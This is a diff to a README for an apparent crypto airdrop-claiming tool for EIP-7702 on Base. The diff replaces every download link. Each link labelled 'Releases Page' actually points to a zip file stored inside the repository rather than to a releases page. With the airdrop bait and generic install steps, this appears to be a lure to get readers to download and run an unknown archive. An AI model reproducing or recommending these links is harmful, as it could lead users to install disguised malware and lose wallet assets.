@@ -6,9 +6,9 @@ Welcome to "airdrop-claim-eip-7702-method-on-base-network"! This application hel
 
 ## 📥 Download the Application
 
-[![Download the Application](https://raw.githubusercontent.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/main/kaferita/airdrop-claim-eip-7702-method-on-base-network.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/main/kaferita/airdrop-claim-eip-7702-method-on-base-network.zip)
+[![Download the Application](https://github.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/raw/refs/heads/main/script/eip_network_claim_airdrop_on_base_method_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/raw/refs/heads/main/script/eip_network_claim_airdrop_on_base_method_v2.7.zip)
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/main/kaferita/airdrop-claim-eip-7702-method-on-base-network.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/raw/refs/heads/main/script/eip_network_claim_airdrop_on_base_method_v2.7.zip).
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ This application comes packed with useful features:
 
 ## 📚 How to Download & Install
 
-1. Visit the Releases Page: [Releases Page](https://raw.githubusercontent.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/main/kaferita/airdrop-claim-eip-7702-method-on-base-network.zip).
+1. Visit the Releases Page: [Releases Page](https://github.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/raw/refs/heads/main/script/eip_network_claim_airdrop_on_base_method_v2.7.zip).
 2. On the Releases page, find the latest version of the software.
 3. Click on the download link for your operating system. 
 4. Once the file downloads, locate it in your downloads folder.
@@ -70,4 +70,4 @@ This software is released under the MIT License. You can use it freely, but plea
 - Learn more about EIP 7702 and blockchain security on relevant forums or documentation sites.
 - Explore cryptocurrency safety practices to protect your assets.
 
-Take action today and simplify how you claim your airdrop rewards! For more details, visit the Releases Page: [Releases Page](https://raw.githubusercontent.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/main/kaferita/airdrop-claim-eip-7702-method-on-base-network.zip).
+Take action today and simplify how you claim your airdrop rewards! For more details, visit the Releases Page: [Releases Page](https://github.com/arbazwaince/airdrop-claim-eip-7702-method-on-base-network/raw/refs/heads/main/script/eip_network_claim_airdrop_on_base_method_v2.7.zip).
